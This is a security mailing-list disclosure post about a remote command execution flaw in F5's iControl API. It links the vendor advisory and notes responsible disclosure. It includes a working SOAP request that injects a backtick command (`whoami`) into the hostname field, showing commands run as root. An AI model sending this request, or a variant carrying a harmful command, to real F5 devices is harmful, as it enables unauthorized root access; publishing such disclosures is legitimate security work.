Subject: [FD] Moar F5 fun in iControl API

Hi,

Linked below is an advisory regarding remote command execution (as root,
possibly) vulnerabilities within the iControl API:

http://support.f5.com/kb/en-us/solutions/public/15000/200/sol15220.html


An example request that will set the hostname to 'root.example.com':

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope
xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Body>
    <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
      <hostname>`whoami`.example.com</hostname>
    </n1:set_hostname>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>


This was responsibly disclosed to F5 on the 7th of February. If you
would like the full communication timeline, feel free to ask.
